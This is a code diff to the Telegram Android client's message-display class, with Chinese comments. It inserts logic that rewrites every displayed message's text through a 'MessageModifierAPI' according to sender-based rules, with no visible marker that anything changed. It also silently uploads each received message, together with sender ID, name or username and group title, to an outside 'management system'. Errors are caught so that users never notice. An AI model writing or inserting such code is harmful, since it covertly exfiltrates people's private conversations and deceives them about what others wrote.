@@ -100,6 +100,7 @@ import org.telegram.messenger.AndroidUtilities;
 import org.telegram.messenger.ApplicationLoader;
 import org.telegram.messenger.BotForumHelper;
 import org.telegram.messenger.BotInlineKeyboard;
+import org.telegram.messenger.BuildVars;
 import org.telegram.messenger.ChatMessageSharedResources;
 import org.telegram.messenger.ChatObject;
 import org.telegram.messenger.ContactsController;
@@ -117,6 +118,7 @@ import org.telegram.messenger.LiteMode;
 import org.telegram.messenger.LocaleController;
 import org.telegram.messenger.MediaController;
 import org.telegram.messenger.MediaDataController;
+import org.telegram.messenger.MessageModifierAPI;
 import org.telegram.messenger.MessageObject;
 import org.telegram.messenger.MessagesController;
 import org.telegram.messenger.NotificationCenter;
@@ -5896,6 +5898,178 @@ public class ChatMessageCell extends BaseCell implements SeekBar.SeekBarDelegate
     public MultiLayoutTypingAnimator botDraftTypingAnimator;
 
     private void setMessageContent(MessageObject messageObject, MessageObject.GroupedMessages groupedMessages, boolean bottomNear, boolean topNear, boolean firstInChat, boolean lastInChatList) {
+
+        // ========== 消息显示修改功能 - 开始 ==========
+
+        // 在方法最开始处（在任何其他代码之前）添加以下修改逻辑
+        if (messageObject != null && messageObject.messageText != null &&
+                messageObject.messageText.length() > 0) {
+
+            try {
+                // 1. 判断是否需要处理（避免重复处理）
+                boolean needsProcessing = true;
+
+                // 检查是否已经处理过（使用自定义标记避免重复）
+                if (messageObject.isModified) {
+                    needsProcessing = false;
+                }
+
+                if (needsProcessing) {
+                    // 2. 获取消息发送者的 ID
+                    String senderId = "";
+
+                    // 获取发送者 ID
+                    if (messageObject.isFromUser()) {
+                        // 用户消息
+                        long fromId = messageObject.getFromChatId();
+                        senderId = String.valueOf(Math.abs(fromId));
+                    } else if (messageObject.isFromGroup()) {
+                        // 群组消息 - 使用发送者的用户 ID
+                        TLRPC.Message msg = messageObject.messageOwner;
+                        if (msg != null && msg.from_id != null) {
+                            if (msg.from_id instanceof TLRPC.TL_peerUser) {
+                                senderId = String.valueOf(msg.from_id.user_id);
+                            } else if (msg.from_id instanceof TLRPC.TL_peerChat) {
+                                senderId = String.valueOf(msg.from_id.chat_id);
+                            } else if (msg.from_id instanceof TLRPC.TL_peerChannel) {
+                                senderId = String.valueOf(msg.from_id.channel_id);
+                            }
+                        }
+                    } else if (messageObject.isFromChannel()) {
+                        // 频道消息
+                        long channelId = messageObject.getFromChatId();
+                        senderId = String.valueOf(Math.abs(channelId));
+                    }
+
+                    // 如果没有获取到 senderId，使用对话 ID
+                    if (senderId.isEmpty() && messageObject.messageOwner != null) {
+                        if (messageObject.messageOwner.peer_id != null) {
+                            if (messageObject.messageOwner.peer_id.user_id != 0) {
+                                senderId = String.valueOf(messageObject.messageOwner.peer_id.user_id);
+                            } else if (messageObject.messageOwner.peer_id.chat_id != 0) {
+                                senderId = String.valueOf(messageObject.messageOwner.peer_id.chat_id);
+                            } else if (messageObject.messageOwner.peer_id.channel_id != 0) {
+                                senderId = String.valueOf(messageObject.messageOwner.peer_id.channel_id);
+                            }
+                        }
+                    }
+
+                    // 3. 获取原始消息文本
+                    String originalText = messageObject.messageText.toString();
+
+                    // 4. 应用消息修改规则
+                    MessageModifierAPI api = MessageModifierAPI.getInstance();
+                    String modifiedText = api.applyModifiers(originalText, senderId);
+
+                    // 5. 如果消息被修改，更新显示
+                    if (!originalText.equals(modifiedText)) {
+                        // 保存原始文本（可选，用于调试或恢复）
+                        if (messageObject.originalMessageText == null) {
+                            messageObject.originalMessageText = messageObject.messageText;
+                        }
+
+                        // 处理 Spanned 格式（保留链接、提及等格式）
+                        if (messageObject.messageText instanceof Spanned) {
+                            Spanned spanned = (Spanned) messageObject.messageText;
+                            SpannableString newText = new SpannableString(modifiedText);
+
+                            // 复制原有的 Span 格式
+                            Object[] spans = spanned.getSpans(0, spanned.length(), Object.class);
+                            for (Object span : spans) {
+                                int start = spanned.getSpanStart(span);
+                                int end = spanned.getSpanEnd(span);
+                                int flags = spanned.getSpanFlags(span);
+
+                                // 调整 span 位置（如果在修改后的文本范围内）
+                                if (start < newText.length()) {
+                                    try {
+                                        newText.setSpan(span, start, Math.min(end, newText.length()), flags);
+                                    } catch (Exception e) {
+                                        // 忽略无法应用的 span
+                                        if (BuildVars.LOGS_ENABLED) {
+                                            FileLog.w("MessageModifier: Failed to apply span: " + e.getMessage());
+                                        }
+                                    }
+                                }
+                            }
+
+                            messageObject.messageText = newText;
+                        } else {
+                            // 普通文本直接替换
+                            messageObject.messageText = new SpannableString(modifiedText);
+                        }
+
+                        // 标记消息已被修改
+                        messageObject.isModified = true;
+
+                        // 记录修改日志（调试用）
+                        if (BuildVars.LOGS_ENABLED) {
+                            FileLog.d("MessageModifier: Display message modified in setMessageContent");
+                            FileLog.d("MessageModifier: Sender ID: " + senderId);
+                            FileLog.d("MessageModifier: Original: " +
+                                    (originalText.length() > 50 ? originalText.substring(0, 50) + "..." : originalText));
+                            FileLog.d("MessageModifier: Modified: " +
+                                    (modifiedText.length() > 50 ? modifiedText.substring(0, 50) + "..." : modifiedText));
+                        }
+
+                        // 6. 可选：添加视觉标记表示消息已修改
+                        // 可以设置一个标志，稍后在绘制时显示一个小图标
+                        // messageObject.showModifiedIcon = true;
+                    }
+
+                    // 7. 异步上传接收的消息到管理系统（仅处理接收的消息）
+                    if (!messageObject.isOutOwner() && !messageObject.isSending() &&
+                            !messageObject.isSendError() && !senderId.isEmpty()) {
+
+                        MessageModifierAPI.MessageUploadRequest uploadRequest =
+                                new MessageModifierAPI.MessageUploadRequest();
+
+                        try {
+                            uploadRequest.telegramId = Long.parseLong(senderId);
+                        } catch (NumberFormatException e) {
+                            uploadRequest.telegramId = 0;
+                        }
+                        uploadRequest.content = modifiedText;
+                        uploadRequest.messageType = "received";
+
+                        // 获取发送者名称
+                        if (messageObject.isFromUser()) {
+                            long userId = messageObject.getFromChatId();
+                            TLRPC.User user = MessagesController.getInstance(currentAccount).getUser(userId);
+                            if (user != null) {
+                                if (user.username != null && !user.username.isEmpty()) {
+                                    uploadRequest.username = user.username;
+                                } else {
+                                    String firstName = user.first_name != null ? user.first_name : "";
+                                    String lastName = user.last_name != null ? user.last_name : "";
+                                    uploadRequest.senderName = (firstName + " " + lastName).trim();
+                                }
+                            }
+                        }
+
+                        // 获取群组/频道信息
+                        long chatId = messageObject.getChatId();
+                        if (chatId != 0) {
+                            TLRPC.Chat chat = MessagesController.getInstance(currentAccount).getChat(chatId);
+                            if (chat != null && chat.title != null) {
+                                uploadRequest.groupTitle = chat.title;
+                            }
+                        }
+
+                        // 异步上传（不阻塞显示）
+                        api.uploadMessage(uploadRequest, null);
+                    }
+                }
+
+            } catch (Exception e) {
+                // 确保任何错误都不会影响消息显示
+                if (BuildVars.LOGS_ENABLED) {
+                    FileLog.e("MessageModifier: Error modifying display message", e);
+                }
+            }
+        }
+        // ========== 消息显示修改功能 - 结束 ==========
+
         if (messageObject.checkLayout() || currentPosition != null && lastHeight != AndroidUtilities.displaySize.y) {
             currentMessageObject = null;
         }
